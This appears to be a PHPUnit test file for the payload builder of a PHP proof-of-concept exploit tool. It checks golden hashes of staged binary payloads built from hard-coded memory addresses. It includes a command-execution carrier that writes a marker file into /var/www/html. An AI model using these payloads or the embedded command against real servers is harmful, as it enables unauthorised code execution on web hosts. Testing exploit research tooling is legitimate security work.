<?php

declare(strict_types=1);

namespace Php2ShellTui\Tests\Unit;

use Php2ShellTui\Poc\PayloadBuilder;
use PHPUnit\Framework\TestCase;

final class PayloadBuilderTest extends TestCase
{
    private string $dir;

    protected function setUp(): void
    {
        $this->dir = sys_get_temp_dir() . '/p2s-payload-' . bin2hex(random_bytes(6));
        mkdir($this->dir, 0o755, true);
    }

    protected function tearDown(): void
    {
        foreach (glob($this->dir . '/*') ?: [] as $path) {
            @unlink($path);
        }
        @rmdir($this->dir);
    }

    public function testA1MatchesTheGoldenPayload(): void
    {
        $path = $this->dir . '/a1.bin';
        (new PayloadBuilder())->a1($path, 78);

        self::assertSame(1_060_211, filesize($path));
        self::assertSame('8e8fc166e6b326d20bb7611d8ef3cee3bd5da46447985312c1492ab0a44d1eb6', hash_file('sha256', $path));
    }

    public function testB1MatchesTheGoldenPayload(): void
    {
        $path = $this->dir . '/b1.bin';
        (new PayloadBuilder())->b1($path, 0xC8000, true);

        self::assertSame(33_128_677, filesize($path));
        self::assertSame('b6c547e0e9a2bb26607df1521de96f4d5c9adf4621c28b7ab491587b21ae40f2', hash_file('sha256', $path));
    }

    public function testA2MatchesTheGoldenPayload(): void
    {
        $path = $this->dir . '/a2.bin';
        (new PayloadBuilder())->a2($path);

        self::assertSame(279_369, filesize($path));
        self::assertSame('7af66c8f35c5fa6b47a539da6dca361d19543d9f62d61e4af891c2802bd5e236', hash_file('sha256', $path));
    }

    public function testTheStage3CarrierMatchesTheGoldenPayload(): void
    {
        $carrier = (new PayloadBuilder())->stage3Carrier(
            0x7ffffc4f8398,
            0x7ffffe478370,
            'echo P2S1234>/var/www/html/p',
        );

        self::assertSame(384, strlen($carrier));
        self::assertSame('a4c94fb1ffb8839127d119c846b14c121a9b5425179ff028b91c666c4ebcd239', hash('sha256', $carrier));
    }

    public function testB2MatchesTheGoldenPayload(): void
    {
        $path = $this->dir . '/b2.bin';
        $builder = new PayloadBuilder();
        $carrier = $builder->stage3Carrier(0x7ffffc4f8398, 0x7ffffe478370, 'echo P2S1234>/var/www/html/p');
        $builder->b2($path, $carrier, 0x7ffffc4f8398);

        self::assertSame(451_384, filesize($path));
        self::assertSame('be976f6a8b7c3033ecb6b1957c48f700134d13db0157bcfbf67a720ec7189f6a', hash_file('sha256', $path));
    }

    public function testItRejectsAnUnknownSpecItem(): void
    {
        $this->expectException(\InvalidArgumentException::class);
        (new PayloadBuilder())->b1($this->dir . '/bad.bin', 0xC8000, true, 'Z:1');
    }
}
